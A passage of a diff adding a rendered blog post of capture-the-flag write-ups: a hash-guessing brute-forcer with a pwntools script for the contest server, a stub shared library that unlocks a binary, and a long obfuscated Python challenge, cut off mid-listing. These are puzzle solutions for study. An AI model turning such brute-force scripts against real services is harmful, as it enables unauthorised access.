+                            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (server_result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;=&#39;</span>){
+                                printf(<span style="color:#e6db74">&#34;GOT THE PASS! %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, guess);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+<span style="color:#75715e">// Compilation
+</span><span style="color:#75715e">// gcc gen_hash.c sha1.c -O3 
+</span></code></pre></div><p>And the remote interaction script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;uppers-downers.hack.fe-ctf.dk&#34;</span>, <span style="color:#ae81ff">1337</span>)
+r<span style="color:#f92672">.</span>recvline()
+salt <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+
+p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;./a.out&#34;</span>, salt])
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    to_send <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    print(to_send)
+
+    r<span style="color:#f92672">.</span>sendline(to_send)
+    server_result <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    
+    p<span style="color:#f92672">.</span>sendline(server_result)
+</code></pre></div><p><code>flag{My h34rt fe3ls l1ke an alligator!}</code></p>
+<p>A fun fact about this challenge was we originally solved it without optimization
+flags for gcc, and using time, we calculated that it took:</p>
+<pre tabindex="0"><code>real    11m7.001s
+user    9m49.339s
+sys     0m0.325s
+</code></pre><p>Now with the O3 flag:</p>
+<pre tabindex="0"><code>real    3m26.973s
+user    2m50.014s
+sys     0m0.156s
+</code></pre><h1 id="qualifiers---libnotfound">Qualifiers - libnotfound</h1>
+<p>Upon reversing the binary we see that it wants a shared object
+which implements the functions as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// foo.c
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo_add</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b){
+    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b;
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo_sub</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b){
+    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">-</span>b; 
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo_mul</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b){
+    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">*</span>b;
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo_div</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b){
+    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">/</span>b;
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo_mod</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">int</span> b){
+    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">%</span>b;
+}
+
+<span style="color:#75715e">// 1. gcc -c -Wall -Werror -fpic foo.c
+</span><span style="color:#75715e">// 2. gcc -shared -o libfoo.so foo.o
+</span></code></pre></div><p>Now compiling that to a shared object and setting our library path we have:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/fe-ctf/libnotfound$ export LD_LIBRARY_PATH=.
+cave@townie:~/CTF/fe-ctf/libnotfound$ ./challenge
+flag{hello? yes, this is flag}
+</code></pre><h1 id="qualifiers---snake-jazz">Qualifiers - Snake Jazz</h1>
+<p>I just changed the magic file, after reading the source code, and convincing
+myself it was a VM which at some point would refer to some memory to load
+the flag, so i YOLO&rsquo;d and got the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> magic;_<span style="color:#f92672">+</span>___<span style="color:#f92672">+---+---+-</span>__<span style="color:#f92672">+++-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">++++-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-+++-++---</span>\
+_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+++-+--++</span>__<span style="color:#f92672">-++</span>___<span style="color:#f92672">++++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+-+++</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+++-</span>_<span style="color:#f92672">+--++-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">---</span>_\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-++-+</span>_<span style="color:#f92672">++--+</span>__<span style="color:#f92672">+</span>__<span style="color:#f92672">++-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">--+--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">--++</span>__<span style="color:#f92672">-+-</span>____<span style="color:#f92672">-</span>_<span style="color:#f92672">+++-</span>_<span style="color:#f92672">++---+-</span>__<span style="color:#f92672">+++++</span>_<span style="color:#f92672">+-+++-</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">++-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+-+++--</span>_<span style="color:#f92672">-</span>\
+_<span style="color:#f92672">++</span>______<span style="color:#f92672">++-+-++</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">--</span>___<span style="color:#f92672">-+</span>_<span style="color:#f92672">+++-++</span>_<span style="color:#f92672">+-++</span>_<span style="color:#f92672">-+-+-</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">-++---+</span>__<span style="color:#f92672">+</span>_____<span style="color:#f92672">+</span>__<span style="color:#f92672">--+</span>_<span style="color:#f92672">--+++</span>__<span style="color:#f92672">+--+</span>_<span style="color:#f92672">+--+</span>___<span style="color:#f92672">-+++++++</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">++++-</span>\
+<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>____<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-+-+</span>__<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">----++-++-+</span>__<span style="color:#f92672">+-+----</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">+++</span>_<span style="color:#f92672">-+</span>\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">+--+--</span>__<span style="color:#f92672">--+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">+--++</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++-++</span>_<span style="color:#f92672">+++++-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">---+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+-</span>__\
+<span style="color:#f92672">++-----++-+--</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">+--</span>__<span style="color:#f92672">++-</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">--+-+-+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+++</span>__<span style="color:#f92672">+</span>\
+<span style="color:#f92672">+-</span>_<span style="color:#f92672">--+++++--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>___<span style="color:#f92672">-</span>___<span style="color:#f92672">+++-</span>_<span style="color:#f92672">++++-++-+</span>_<span style="color:#f92672">++-++</span>_<span style="color:#f92672">-+++++</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">---</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>_\
+<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">--+++</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-++---+</span>_<span style="color:#f92672">+-+-+</span>__<span style="color:#f92672">+++</span>_<span style="color:#f92672">----</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">-++</span>___<span style="color:#f92672">---++-</span>__\
+<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">+---+++--++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+----</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-+---++</span>_<span style="color:#f92672">+++-+</span>_<span style="color:#f92672">+</span>_____<span style="color:#f92672">----+-+</span>\
+<span style="color:#f92672">++-+</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">++--</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">++--+++</span>__<span style="color:#f92672">--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-----+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">+++-+</span>__<span style="color:#f92672">-+</span>__\
+<span style="color:#f92672">-+</span>___<span style="color:#f92672">++-++</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">----</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+</span>_____<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+++-</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">-</span>_\
+<span style="color:#f92672">+++-</span>__<span style="color:#f92672">--++-+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+--</span>___<span style="color:#f92672">-+-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-++-+-+-</span>_<span style="color:#f92672">+</span> <span style="color:#f92672">+</span>_<span style="color:#f92672">++++</span>___<span style="color:#f92672">--+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>\
+____<span style="color:#f92672">---</span>___<span style="color:#f92672">++++-+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">---</span>__<span style="color:#f92672">++-++-+-</span>__<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">----</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>____<span style="color:#f92672">-</span>_<span style="color:#f92672">+---</span>\
+_<span style="color:#f92672">+--+-</span>_<span style="color:#f92672">+----</span>_<span style="color:#f92672">+--++</span>___<span style="color:#f92672">--</span>__<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-+++-+--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-+</span>_<span style="color:#f92672">--++-----+++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-+-</span>\
+<span style="color:#f92672">---+</span>_<span style="color:#f92672">+-+++</span>__<span style="color:#f92672">+++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+++</span>_<span style="color:#f92672">-++</span>____<span style="color:#f92672">--++-</span>__<span style="color:#f92672">+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">----+++--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>\
+_<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">--++</span>_<span style="color:#f92672">+++++</span>_<span style="color:#f92672">+</span>______<span style="color:#f92672">---+-+++++</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-+--</span>_\
+<span style="color:#f92672">+---+++</span>__<span style="color:#f92672">-++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">+---+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+</span>__<span style="color:#f92672">+++-+</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>___<span style="color:#f92672">-+</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++-</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">++---</span>\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+----</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>___<span style="color:#f92672">--</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">-++++++</span>_<span style="color:#f92672">-++-+-</span>_<span style="color:#f92672">--++-</span>___<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--++---++</span>\
+<span style="color:#f92672">+---+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-+--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-++--++</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_____<span style="color:#f92672">+---+-+++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>\
+___<span style="color:#f92672">+++</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--+++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">----+</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>__<span style="color:#f92672">+++-</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>\
+<span style="color:#f92672">+-++--</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+---</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">--</span>___<span style="color:#f92672">+--+-</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+</span>___<span style="color:#f92672">--+++-++-+</span>\
+_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">-+-</span>__<span style="color:#f92672">+--+</span>_<span style="color:#f92672">-++-++</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+-+---++--+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">+-</span>\
+<span style="color:#f92672">-++</span>_<span style="color:#f92672">+++-+</span>_<span style="color:#f92672">+</span>_____<span style="color:#f92672">----+-+++-+</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">++--</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">++--+++</span>__<span style="color:#f92672">--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>__\
+<span style="color:#f92672">---+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">++++</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">---</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">--</span>__<span style="color:#f92672">-+---++-</span>_<span style="color:#f92672">+-</span>\
+<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+-+---+++</span>_<span style="color:#f92672">-</span> <span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--</span> _<span style="color:#f92672">++-++-</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">----</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">-++</span>____<span style="color:#f92672">-++-</span>\
+___<span style="color:#f92672">-</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">--+-+-+</span>_<span style="color:#f92672">--</span>___<span style="color:#f92672">+++</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">--</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">++-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-+</span>\
+<span style="color:#f92672">---+</span>__<span style="color:#f92672">--------</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">--+</span>_____<span style="color:#f92672">---</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">+++----</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+-</span>_<span style="color:#f92672">--++++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-</span>___<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+++</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">-</span>__<span style="color:#f92672">--</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+-++</span>_<span style="color:#f92672">--</span>___<span style="color:#f92672">+-</span>_<span style="color:#f92672">+++-</span>_<span style="color:#f92672">-</span>\
+_<span style="color:#f92672">+-+++</span>_<span style="color:#f92672">++-------</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+++++</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-</span>__<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">----+------+</span>_<span style="color:#f92672">+-+-</span>__<span style="color:#f92672">+-</span>\
+<span style="color:#f92672">--+--+--+</span>__<span style="color:#f92672">+-++++--</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+--</span>___<span style="color:#f92672">--+++</span>__<span style="color:#f92672">--+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">---+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+++-+-</span>\
+<span style="color:#f92672">--</span>_<span style="color:#f92672">-+</span>____<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+--++-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-+++---+++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">++--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-</span>_\
+<span style="color:#f92672">++-</span>__<span style="color:#f92672">----</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">--+++-</span>_<span style="color:#f92672">--+++</span>_<span style="color:#f92672">--++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++-+</span>_<span style="color:#f92672">--+</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">+++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">-</span>_<span style="color:#f92672">-</span>_\
+<span style="color:#f92672">+</span>_<span style="color:#f92672">+------++--+-+-</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">+--+++----++-</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">++----</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">---+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++-+--++</span>_<span style="color:#f92672">+</span>\
+<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>___<span style="color:#f92672">-</span>__<span style="color:#f92672">---+-+-+-+</span>__<span style="color:#f92672">+-------</span>_<span style="color:#f92672">-</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+---</span>__<span style="color:#f92672">--+++</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">---+</span>_\
+<span style="color:#f92672">+++++</span>__<span style="color:#f92672">+++++---</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">++-</span>__<span style="color:#f92672">++-++---+</span>__<span style="color:#f92672">++--</span>_<span style="color:#f92672">++-+---</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">---</span>__<span style="color:#f92672">-</span>\
+__<span style="color:#f92672">++-+----+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+-+-+</span>__<span style="color:#f92672">---+++-+-+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">--</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">++</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+-+</span>_<span style="color:#f92672">--++</span>_<span style="color:#f92672">+++++</span>_<span style="color:#f92672">+</span>\
+______<span style="color:#f92672">---+-+++++</span>__<span style="color:#f92672">+--</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">-</span>___<span style="color:#f92672">+-+</span>_<span style="color:#f92672">-+--</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+++</span>__<span style="color:#f92672">-++-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+-</span>\
+<span style="color:#f92672">+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">++-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">++</span>\
+<span style="color:#f92672">-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">++-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-</span>\
+<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+++--</span>_<span style="color:#f92672">-++</span>__<span style="color:#f92672">+-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">++-+-</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+-+--</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">--+++-</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+--</span>_<span style="color:#f92672">-+</span>__<span style="color:#f92672">+</span>\
+_<span style="color:#f92672">+</span>_<span style="color:#f92672">-++</span>_<span style="color:#f92672">-----++-</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">+</span>_<span style="color:#f92672">+-++----+++</span>_<span style="color:#f92672">--+</span>__<span style="color:#f92672">+</span>_<span style="color:#f92672">-</span>_<span style="color:#f92672">+---</span>_<span style="color:#f92672">--</span>_<span style="color:#f92672">-+-+</span>_<span style="color:#f92672">-+</span>_<span style="color:#f92672">++</span>__<span style="color:#f92672">--++</span>_<span style="color:#f92672">++</span>\
